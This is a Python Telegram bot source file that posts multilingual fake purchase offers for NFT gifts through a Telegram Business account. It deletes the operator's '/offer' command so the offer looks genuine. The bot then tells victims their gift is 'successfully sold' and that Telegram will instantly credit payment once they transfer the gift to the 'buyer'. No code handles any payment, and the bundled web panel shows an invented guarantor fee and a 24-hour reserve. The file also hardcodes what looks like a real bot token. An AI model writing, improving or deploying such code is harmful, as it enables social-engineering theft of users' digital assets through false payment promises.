import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message,
    BusinessConnection,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo,
    LinkPreviewOptions,
)
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application

TOKEN = "8919998480:AAG2n5NPWx8mcRZOPxcZ3fZn9CvXUG44TFk"

bot = Bot(token=TOKEN)
dp = Dispatcher()

TON_EMOJI_ID = None
active_deals = {}
USE_GRAM_TEXT = False

# Словарь локализации для языков мира
TRANSLATIONS = {
    "ru": {
        "offer_text": "Пользователь {user} предлагает Вам <b>{amount}</b> {currency} за подарок",
        "success_text": "Подарок: {title} <b>успешно продан!</b>\n\nПередайте подарок покупателю для зачисления <b>{amount}</b> {currency}.",
        "btn_accept": "Принять",
        "btn_reject": "Отклонить",
        "btn_transfer": "Передать NFT {name}",
        "btn_how_to": "Как передать",
        "rejected": "❌ Предложение отклонено.",
        "accepted": "Сделка принята!",
        "how_to_text": (
            "<b>Как передать подарок пользователю:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Передайте подарок пользователю: {handle}.\n"
            "2. Нажмите «Передать NFT» и выберите {title}.\n"
            "3. Подтвердите передачу подарка.\n\n"
            "Telegram зафиксирует транзакцию и моментально зачислит оплату на ваш баланс. Резерв действует 24 часа."
        ),
        "btn_back": "Вернуться к передаче"
    },
    "en": {
        "offer_text": "User {user} offers you <b>{amount}</b> {currency} for the gift",
        "success_text": "Gift: {title} <b>successfully sold!</b>\n\nTransfer the gift to the buyer to receive <b>{amount}</b> {currency}.",
        "btn_accept": "Accept",
        "btn_reject": "Reject",
        "btn_transfer": "Transfer NFT {name}",
        "btn_how_to": "How to transfer",
        "rejected": "❌ Offer rejected.",
        "accepted": "Deal accepted!",
        "how_to_text": (
            "<b>How to transfer the gift to the user:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Transfer the gift to the user: {handle}.\n"
            "2. Click 'Transfer NFT' and select {title}.\n"
            "3. Confirm the gift transfer.\n\n"
            "Telegram will record the transaction and instantly credit the payment to your balance. The reserve is valid for 24 hours."
        ),
        "btn_back": "Back to transfer"
    },
    "uk": {
        "offer_text": "Користувач {user} пропонує Вам <b>{amount}</b> {currency} за подарунок",
        "success_text": "Подарунок: {title} <b>успішно продано!</b>\n\nПередайте подарунок покупцю для зарахування <b>{amount}</b> {currency}.",
        "btn_accept": "Прийняти",
        "btn_reject": "Відхилити",
        "btn_transfer": "Передати NFT {name}",
        "btn_how_to": "Як передати",
        "rejected": "❌ Пропозицію відхилено.",
        "accepted": "Угоду прийнято!",
        "how_to_text": (
            "<b>Як передати подарунок користувачу:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Передайте подарунок користувачу: {handle}.\n"
            "2. Натисніть «Передати NFT» та виберіть {title}.\n"
            "3. Підтвердьте передачу подарунка.\n\n"
            "Telegram зафіксує транзакцію та миттєво зарахує оплату на ваш баланс. Резерв діє 24 години."
        ),
        "btn_back": "Повернутися до передачі"
    },
    "es": {
        "offer_text": "El usuario {user} te ofrece <b>{amount}</b> {currency} por el regalo",
        "success_text": "Regalo: {title} <b>¡vendido con éxito!</b>\n\nTransfiere el regalo al comprador para recibir <b>{amount}</b> {currency}.",
        "btn_accept": "Aceptar",
        "btn_reject": "Rechazar",
        "btn_transfer": "Transferir NFT {name}",
        "btn_how_to": "Cómo transferir",
        "rejected": "❌ Oferta rechazada.",
        "accepted": "¡Trato aceptado!",
        "how_to_text": (
            "<b>Cómo transferir el regalo al usuario:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Transfiere el regalo al usuario: {handle}.\n"
            "2. Haz clic en 'Transferir NFT' y selecciona {title}.\n"
            "3. Confirma la transferencia del regalo.\n\n"
            "Telegram registrará la transacción y abonará instantáneamente el pago en tu saldo. La reserva es válida por 24 horas."
        ),
        "btn_back": "Volver a la transferencia"
    },
    "de": {
        "offer_text": "Der Nutzer {user} bietet Ihnen <b>{amount}</b> {currency} für das Geschenk",
        "success_text": "Geschenk: {title} <b>erfolgreich verkauft!</b>\n\nÜbertragen Sie das Geschenk an den Käufer, um <b>{amount}</b> {currency} zu erhalten.",
        "btn_accept": "Annehmen",
        "btn_reject": "Ablehnen",
        "btn_transfer": "NFT übertragen {name}",
        "btn_how_to": "Wie man überträgt",
        "rejected": "❌ Angebot abgelehnt.",
        "accepted": "Angebot angenommen!",
        "how_to_text": (
            "<b>So übertragen Sie das Geschenk an den Nutzer:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Übertragen Sie das Geschenk an den Nutzer: {handle}.\n"
            "2. Klicken Sie auf 'NFT übertragen' und wählen Sie {title} aus.\n"
            "3. Bestätigen Sie die Geschenkübertragung.\n\n"
            "Telegram zeichnet die Transaktion auf und schreibt die Zahlung sofort Ihrem Guthaben gut. Die Reserve ist 24 Stunden gültig."
        ),
        "btn_back": "Zurück zur Übertragung"
    },
    "fr": {
        "offer_text": "L'utilisateur {user} vous propose <b>{amount}</b> {currency} pour le cadeau",
        "success_text": "Cadeau : {title} <b>vendu avec succès !</b>\n\nTransférez le cadeau à l'acheteur pour recevoir <b>{amount}</b> {currency}.",
        "btn_accept": "Accepter",
        "btn_reject": "Rejeter",
        "btn_transfer": "Transférer NFT {name}",
        "btn_how_to": "Comment transférer",
        "rejected": "❌ Offre rejetée.",
        "accepted": "Offre acceptée !",
        "how_to_text": (
            "<b>Comment transférer le cadeau à l'utilisateur :</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Transférez le cadeau à l'utilisateur : {handle}.\n"
            "2. Cliquez sur 'Transférer NFT' et sélectionnez {title}.\n"
            "3. Confirmez le transfert du cadeau.\n\n"
            "Telegram enregistrera la transaction et créditera instantanément le paiement sur votre solde. La réserve est valable 24 heures."
        ),
        "btn_back": "Retour au transfert"
    },
    "zh": {
        "offer_text": "用户 {user} 向您出价 <b>{amount}</b> {currency} 购买礼物",
        "success_text": "礼物：{title} <b>已成功售出！</b>\n\n请将礼物转移给买家以获得 <b>{amount}</b> {currency}。",
        "btn_accept": "接受",
        "btn_reject": "拒绝",
        "btn_transfer": "转移 NFT {name}",
        "btn_how_to": "如何转移",
        "rejected": "❌ 报价已被拒绝。",
        "accepted": "交易已接受！",
        "how_to_text": (
            "<b>如何将礼物转移给用户：</b>\n"
            "<b>{handle}</b>\n\n"
            "1. 将礼物转移给用户：{handle}。\n"
            "2. 点击“转移 NFT”并选择 {title}。\n"
            "3. 确认礼物转移。\n\n"
            "Telegram 将记录交易并将款项立即记入您的余额。保留期为 24 小时。"
        ),
        "btn_back": "返回转移"
    },
    "ar": {
        "offer_text": "المستخدم {user} يعرض عليك <b>{amount}</b> {currency} مقابل الهدية",
        "success_text": "الهدية: {title} <b>تم بيعها بنجاح!</b>\n\nقم بتحويل الهدية إلى المشتري لتلقي <b>{amount}</b> {currency}.",
        "btn_accept": "قبول",
        "btn_reject": "رفض",
        "btn_transfer": "تحويل NFT {name}",
        "btn_how_to": "كيفية التحويل",
        "rejected": "❌ تم رفض العرض.",
        "accepted": "تم قبول العرض!",
        "how_to_text": (
            "<b>كيفية تحويل الهدية للمستخدم:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. تحويل الهدية إلى المستخدم: {handle}.\n"
            "2. انقر فوق 'تحويل NFT' وقم بتحديد {title}.\n"
            "3. تأكيد تحويل الهدية.\n\n"
            "سيسجل Telegram المعاملة ويدفع المبلغ فوراً إلى رصيدك. الاحتياطي صالح لمدة 24 ساعة."
        ),
        "btn_back": "العودة إلى التحويل"
    },
    "pl": {
        "offer_text": "Użytkownik {user} oferuje Ci <b>{amount}</b> {currency} za prezent",
        "success_text": "Prezent: {title} <b>pomyślnie sprzedany!</b>\n\nPrzekaż prezent kupującemu, aby otrzymać <b>{amount}</b> {currency}.",
        "btn_accept": "Zaakceptuj",
        "btn_reject": "Odrzuć",
        "btn_transfer": "Przekaż NFT {name}",
        "btn_how_to": "Jak przekazać",
        "rejected": "❌ Oferta odrzucona.",
        "accepted": "Transakcja zaakceptowana!",
        "how_to_text": (
            "<b>Jak przekazać prezent użytkownikowi:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Przekaż prezent użytkownikowi: {handle}.\n"
            "2. Kliknij „Przekaż NFT” i wybierz {title}.\n"
            "3. Potwierdź przekazanie prezentu.\n\n"
            "Telegram zarejestruje transakcję i natychmiast dopisze płatność do Twojego salda. Rezerwa jest ważna przez 24 godziny."
        ),
        "btn_back": "Powrót do przekazywania"
    },
    "it": {
        "offer_text": "L'utente {user} ti offre <b>{amount}</b> {currency} per il regalo",
        "success_text": "Regalo: {title} <b>venduto con successo!</b>\n\nTrasferisci il regalo all'acquirente per ricevere <b>{amount}</b> {currency}.",
        "btn_accept": "Accetta",
        "btn_reject": "Rifiuta",
        "btn_transfer": "Trasferisci NFT {name}",
        "btn_how_to": "Come trasferire",
        "rejected": "❌ Offerta rifiutata.",
        "accepted": "Offerta accettata!",
        "how_to_text": (
            "<b>Come trasferire il regalo all'utente:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Trasferisci il regalo all'utente: {handle}.\n"
            "2. Clicca su 'Trasferisci NFT' e seleziona {title}.\n"
            "3. Conferma il trasferimento del regalo.\n\n"
            "Telegram registrerà la transazione e accrediterà istantaneamente il pagamento sul tuo saldo. La riserva è valida per 24 ore."
        ),
        "btn_back": "Torna al trasferimento"
    },
    "tr": {
        "offer_text": "Kullanıcı {user} size hediye için <b>{amount}</b> {currency} teklif ediyor",
        "success_text": "Hediye: {title} <b>başarıyla satıldı!</b>\n\n<b>{amount}</b> {currency} tutarının hesabınıza yatması için hediyeyi alıcıya transfer edin.",
        "btn_accept": "Kabul Et",
        "btn_reject": "Reddet",
        "btn_transfer": "NFT Transfer Et {name}",
        "btn_how_to": "Nasıl aktarılır",
        "rejected": "❌ Teklif reddedildi.",
        "accepted": "Teklif kabul edildi!",
        "how_to_text": (
            "<b>Hediyeyi kullanıcıya nasıl transfer edersiniz:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Hediyeyi şu kullanıcıya transfer edin: {handle}.\n"
            "2. 'NFT Transfer Et' seçeneğine tıklayın ve {title} öğesini seçin.\n"
            "3. Hediye transferini onaylayın.\n\n"
            "Telegram işlemi kaydedecek و ödemeyi anında bakiyenize yatıracaktır. Rezerv 24 saat geçerlidir."
        ),
        "btn_back": "Transfer ekranına dön"
    },
    "pt": {
        "offer_text": "O usuário {user} oferece a você <b>{amount}</b> {currency} pelo presente",
        "success_text": "Presente: {title} <b>vendido com sucesso!</b>\n\nTransfira o presente para o comprador para receber <b>{amount}</b> {currency}.",
        "btn_accept": "Aceitar",
        "btn_reject": "Rejeitar",
        "btn_transfer": "Transferir NFT {name}",
        "btn_how_to": "Como transferir",
        "rejected": "❌ Oferta rejeitada.",
        "accepted": "Oferta aceita!",
        "how_to_text": (
            "<b>Como transferir o presente para o usuario:</b>\n"
            "<b>{handle}</b>\n\n"
            "1. Transfira o presente para o usuario: {handle}.\n"
            "2. Clique em 'Transferir NFT' e selecione {title}.\n"
            "3. Confirme a transferencia do presente.\n\n"
            "O Telegram registrara a transacao e creditara o pagamento instantaneamente no seu saldo. A reserva e valida por 24 horas."
        ),
        "btn_back": "Voltar para a transferencia"
    }
}

async def on_startup(bot: Bot):
    global TON_EMOJI_ID
    try:
        sticker_set = await bot.get_sticker_set(name="xRocketIcons")
        if len(sticker_set.stickers) >= 140:
            TON_EMOJI_ID = sticker_set.stickers[139].custom_emoji_id
            logging.info(f"Успешно загружен кастомный эмодзи ID по умолчанию: {TON_EMOJI_ID}")
    except Exception as e:
        logging.error(f"Не удалось загрузить стикерпак xRocketIcons: {e}")

    render_url = os.environ.get("RENDER_EXTERNAL_URL")
    if render_url:
        webhook_url = f"{render_url}/{TOKEN}"
        await bot.set_webhook(webhook_url, drop_pending_updates=True)
        logging.info(f"Вебхук успешно установлен: {webhook_url}")

@dp.message(F.entities)
async def capture_custom_emoji(message: Message):
    global TON_EMOJI_ID
    if message.entities:
        for entity in message.entities:
            if entity.type == "custom_emoji":
                TON_EMOJI_ID = entity.custom_emoji_id
                emoji_preview = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>'
                await message.reply(
                    f"✅ Валюта успешно изменена!\nНовый эмодзи: {emoji_preview}\nID: <code>{TON_EMOJI_ID}</code>", 
                    parse_mode="HTML"
                )
                return

@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    if connection.is_enabled:
        try:
            await bot.send_message(
                chat_id=connection.user.id,
                text="🤖 **Бот успешно подключен** к Telegram Business и готов к управлению чатами!",
                parse_mode="Markdown"
            )
        except Exception as e:
            logging.error(f"Не удалось отправить уведомление пользователю: {e}")

@dp.message(Command("start"))
async def cmd_start(message: Message):
    currency_mode = "<b>Gram</b> (текст)" if USE_GRAM_TEXT else f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' if TON_EMOJI_ID else "💎"
    render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://google.com")
    webapp_url = f"{render_url}/app"

    text = (
        "👋 **Привет! Это бот для управления офферами по NFT/подаркам.**\n\n"
        f"Режим валюты: {currency_mode}\n\n"
        "• Команда /cf — настроить эмодзи.\n"
        "• Откройте Web App для расширенного управления."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🌐 Открыть Web App", web_app=WebAppInfo(url=webapp_url))
        ],
        [
            InlineKeyboardButton(text="🔄 Обновить из xRocketIcons", callback_data="reload_emoji")
        ]
    ])
    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")

@dp.message(Command("cf"))
async def cmd_cf(message: Message):
    text = (
        "💱 <b>Настройка валюты.</b>\n\n"
        "Скиньте кастомный эмодзи в ответ на это сообщение или переключите режим на текст <b>Gram</b> через Web App."
    )
    await message.answer(text, parse_mode="HTML")

@dp.callback_query(F.data == "reload_emoji")
async def process_reload_emoji(callback: CallbackQuery):
    global TON_EMOJI_ID
    try:
        sticker_set = await bot.get_sticker_set(name="xRocketIcons")
        if len(sticker_set.stickers) >= 140:
            TON_EMOJI_ID = sticker_set.stickers[139].custom_emoji_id
            await callback.answer("Эмодзи успешно перезагружен!", show_alert=True)
        else:
            await callback.answer("Не удалось найти нужный стикер в паке.", show_alert=True)
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)

def parse_nft_info(url: str):
    try:
        slug = url.strip("/").split("/")[-1]
        if "-" in slug:
            parts = slug.rsplit("-", 1)
            nft_title = f"{parts[0]}#{parts[1]}"
        else:
            nft_title = slug
        return slug, nft_title
    except Exception:
        return "gift", "TelegramGift"

@dp.business_message(F.text.startswith("/offer"))
async def handle_business_offer(message: Message):
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            chat_id=message.chat.id,
            message_ids=[message.message_id]
        )
    except Exception as e1:
        try:
            await bot.delete_message(
                chat_id=message.chat.id,
                message_id=message.message_id
            )
        except Exception as e2:
            logging.error(f"Не удалось удалить сообщение с командой: {e1} / {e2}")

    args = message.text.split()
    if len(args) < 2:
        return
    
    nft_link = args[1]
    amount = "15.0"
    lang = "ru"

    if "/gram" in args:
        try:
            gram_index = args.index("/gram")
            if len(args) > gram_index + 1:
                amount = args[gram_index + 1]
            if len(args) > gram_index + 2:
                potential_lang = args[gram_index + 2].lower()
                if potential_lang in TRANSLATIONS:
                    lang = potential_lang
        except ValueError:
            pass

    _, nft_title = parse_nft_info(nft_link)
    
    if USE_GRAM_TEXT:
        currency_tag = "<b>Gram</b>"
    else:
        currency_tag = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>' if TON_EMOJI_ID else "💎"
    
    user = message.from_user
    user_display_name = user.first_name if user and user.first_name else "User"
    user_username = user.username if user and user.username else None
    
    if user_username:
        user_link = f"https://t.me/{user_username}"
    else:
        user_link = f"tg://user?id={user.id}" if user else "https://t.me/"

    linked_title = f'<a href="{nft_link}">{nft_title}</a>'
    t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])

    text = (
        f"{t['offer_text'].format(user=user_display_name, amount=amount, currency=currency_tag)}\n"
        f"{linked_title}"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=t['btn_reject'], callback_data=f"reject_{lang}"),
            InlineKeyboardButton(text=t['btn_accept'], callback_data=f"accept_{lang}")
        ]
    ])

    preview_options = LinkPreviewOptions(
        is_disabled=False,
        url=nft_link,
        prefer_large_media=True,
        show_above_text=True
    )

    sent_message = await bot.send_message(
        chat_id=message.chat.id,
        text=text,
        reply_markup=keyboard,
        parse_mode="HTML",
        link_preview_options=preview_options,
        business_connection_id=message.business_connection_id
    )
    
    active_deals[sent_message.message_id] = {
        "nft_link": nft_link,
        "nft_title": nft_title,
        "amount": amount,
        "user_display_name": user_display_name,
        "user_link": user_link,
        "lang": lang,
        "currency_tag": currency_tag
    }

@dp.callback_query(F.data.startswith("accept"))
async def process_accept(callback: CallbackQuery):
    lang = callback.data.split("_")[1] if "_" in callback.data else "ru"
    t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])

    msg_id = callback.message.message_id
    deal = active_deals.get(msg_id, {
        "nft_title": "TelegramGift", 
        "nft_link": "https://t.me/nft/", 
        "amount": "15.0", 
        "user_display_name": "User",
        "user_link": "https://t.me/",
        "currency_tag": "<b>Gram</b>"
    })

    nft_title = deal["nft_title"]
    nft_link = deal["nft_link"]
    amount = deal["amount"]
    user_display_name = deal["user_display_name"]
    user_link = deal["user_link"]
    currency_tag = deal.get("currency_tag", "<b>Gram</b>")

    linked_title = f'<a href="{nft_link}">{nft_title}</a>'
    new_text = t['success_text'].format(title=linked_title, amount=amount, currency=currency_tag)

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=t['btn_transfer'].format(name=user_display_name), url=user_link)
        ],
        [
            InlineKeyboardButton(text=t['btn_how_to'], callback_data=f"how_to_{lang}")
        ]
    ])

    preview_options = LinkPreviewOptions(
        is_disabled=False,
        url=nft_link,
        prefer_large_media=True,
        show_above_text=True
    )

    await callback.message.edit_text(
        new_text,
        reply_markup=new_keyboard,
        parse_mode="HTML",
        link_preview_options=preview_options
    )
    await callback.answer(t['accepted'])

@dp.callback_query(F.data.startswith("how_to"))
async def process_how_to(callback: CallbackQuery):
    lang = callback.data.split("_")[2] if "_" in callback.data else "ru"
    t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])

    msg_id = callback.message.message_id
    deal = active_deals.get(msg_id, {"nft_title": "TelegramGift", "user_display_handle": "@user"})
    nft_title = deal.get("nft_title", "TelegramGift")
    user_display_handle = deal.get("user_display_handle", "@user")

    instruction_text = t['how_to_text'].format(handle=user_display_handle, title=nft_title)
    back_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=t['btn_back'], callback_data=f"back_to_deal_{lang}")
        ]
    ])

    await callback.message.edit_text(
        instruction_text,
        reply_markup=back_keyboard,
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("back_to_deal"))
async def process_back(callback: CallbackQuery):
    lang = callback.data.split("_")[3] if "_" in callback.data else "ru"
    t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])

    msg_id = callback.message.message_id
    deal = active_deals.get(msg_id, {
        "nft_title": "TelegramGift", 
        "nft_link": "https://t.me/nft/", 
        "amount": "15.0", 
        "user_display_name": "User",
        "user_link": "https://t.me/",
        "currency_tag": "<b>Gram</b>"
    })
    
    nft_title = deal.get("nft_title", "TelegramGift")
    nft_link = deal.get("nft_link", "https://t.me/nft/")
    amount = deal.get("amount", "15.0")
    user_display_name = deal.get("user_display_name", "User")
    user_link = deal.get("user_link", "https://t.me/")
    currency_tag = deal.get("currency_tag", "<b>Gram</b>")

    linked_title = f'<a href="{nft_link}">{nft_title}</a>'
    new_text = t['success_text'].format(title=linked_title, amount=amount, currency=currency_tag)

    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=t['btn_transfer'].format(name=user_display_name), url=user_link)
        ],
        [
            InlineKeyboardButton(text=t['btn_how_to'], callback_data=f"how_to_{lang}")
        ]
    ])

    preview_options = LinkPreviewOptions(
        is_disabled=False,
        url=nft_link,
        prefer_large_media=True,
        show_above_text=True
    )

    await callback.message.edit_text(
        new_text,
        reply_markup=new_keyboard,
        parse_mode="HTML",
        link_preview_options=preview_options
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("reject"))
async def process_reject(callback: CallbackQuery):
    lang = callback.data.split("_")[1] if "_" in callback.data else "ru"
    t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])
    await callback.message.edit_text(
        t['rejected'],
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )
    await callback.answer()

async def handle_webapp(request):
    html_content = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>NFT & Gram Manager</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            :root {
                --bg-color: var(--tg-theme-bg-color, #ffffff);
                --text-color: var(--tg-theme-text-color, #000000);
                --hint-color: var(--tg-theme-hint-color, #999999);
                --card-bg: var(--tg-theme-secondary-bg-color, #f4f4f5);
                --button-color: var(--tg-theme-button-color, #2481cc);
                --button-text: var(--tg-theme-button-text-color, #ffffff);
            }
            body {
                background-color: var(--bg-color);
                color: var(--text-color);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 16px;
                box-sizing: border-box;
            }
            h1 { font-size: 20px; text-align: center; margin-bottom: 4px; }
            p.subtitle { text-align: center; color: var(--hint-color); font-size: 13px; margin-top: 0; }
            .card {
                background: var(--card-bg);
                border-radius: 12px;
                padding: 16px;
                margin-top: 14px;
            }
            .card h3 { margin-top: 0; font-size: 16px; margin-bottom: 8px; }
            .toggle-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
                font-size: 15px;
                font-weight: 500;
            }
            .switch {
                position: relative;
                display: inline-block;
                width: 50px;
                height: 28px;
            }
            .switch input { opacity: 0; width: 0; height: 0; }
            .slider {
                position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
                background-color: #ccc; transition: .3s; border-radius: 28px;
            }
            .slider:before {
                position: absolute; content: ""; height: 22px; width: 22px; left: 3px; bottom: 3px;
                background-color: white; transition: .3s; border-radius: 50%;
            }
            input:checked + .slider { background-color: var(--button-color); }
            input:checked + .slider:before { transform: translateX(22px); }
            .calc-input {
                width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--hint-color);
                background: var(--bg-color); color: var(--text-color); font-size: 16px; box-sizing: border-box; margin-top: 6px;
            }
            .btn {
                background-color: var(--button-color);
                color: var(--button-text);
                border: none;
                padding: 12px;
                border-radius: 10px;
                font-size: 15px;
                font-weight: 600;
                cursor: pointer;
                width: 100%;
                margin-top: 12px;
            }
            .stat-badge {
                display: inline-block; background: var(--button-color); color: #fff;
                padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: 600;
            }
        </style>
    </head>
    <body>
        <h1>🎛 NFT & Gram Control</h1>
        <p class="subtitle" id="user-greeting">Загрузка профиля...</p>

        <div class="card">
            <h3>💱 Формат валюты</h3>
            <div class="toggle-row">
                <span>Использовать текст <b>Gram</b></span>
                <label class="switch">
                    <input type="checkbox" id="gramToggle" onchange="toggleGramMode()">
                    <span class="slider"></span>
                </label>
            </div>
            <p style="font-size: 12px; color: var(--hint-color); margin-top: 8px; margin-bottom: 0;">
                Включено — в офферах пишется жирный текст <b>Gram</b>. Выключено — синий эмодзи алмаза.
            </p>
        </div>

        <div class="card">
            <h3>📊 Калькулятор сделок (Gram / TON)</h3>
            <label style="font-size: 13px; color: var(--hint-color);">Сумма оффера:</label>
            <input type="number" id="calcAmount" class="calc-input" value="60">
            <p style="font-size: 14px; margin-top: 10px; margin-bottom: 0;">
                Комиссия гаранта (0%): <span class="stat-badge">0 Gram</span>
            </p>
        </div>

        <div class="card">
            <h3>🛡 Безопасность и холды</h3>
            <p style="font-size: 13px; margin: 0; color: var(--hint-color);">
                Резерв сделки заморожен на 24 часа. После подтверждения передачи NFT средства мгновенно поступают на баланс.
            </p>
        </div>

        <button class="btn" onclick="Telegram.WebApp.close()">Закрыть панель</button>

        <script>
            const tg = window.Telegram.WebApp;
            tg.expand();

            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                document.getElementById('user-greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name}!`;
            }

            const gramToggle = document.getElementById('gramToggle');
            gramToggle.checked = localStorage.getItem('useGramText') === 'true';

            function toggleGramMode() {
                localStorage.setItem('useGramText', gramToggle.checked);
                tg.HapticFeedback.notificationOccurred('success');
            }
        </script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

async def handle_root(request):
    return web.Response(text="Bot is working via Webhooks!")

async def main():
    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_get("/app", handle_webapp)

    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    webhook_requests_handler.register(app, path=f"/{TOKEN}")
    setup_application(app, dp, bot=bot)

    dp.startup.register(on_startup)

    port = int(os.environ.get("PORT", 8080))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

    await asyncio.Event().wait()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
